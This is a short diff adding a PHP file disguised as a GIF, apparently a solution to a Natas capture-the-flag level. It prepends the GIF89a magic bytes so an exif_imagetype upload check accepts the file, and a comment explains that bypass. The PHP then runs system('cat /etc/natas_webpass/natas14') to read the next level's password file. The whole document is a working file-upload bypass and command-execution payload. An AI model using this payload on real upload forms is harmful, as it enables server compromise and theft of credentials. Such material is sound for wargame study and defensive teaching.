@@ -1,0 +1,5 @@
+GIF89a
+<!-- The above is tested by exif_imagetype and it outputs constant IMAGETYPE_GIF as needed to bypass the "security" measure -->
+<?php
+    echo system("cat /etc/natas_webpass/natas14");
+?>
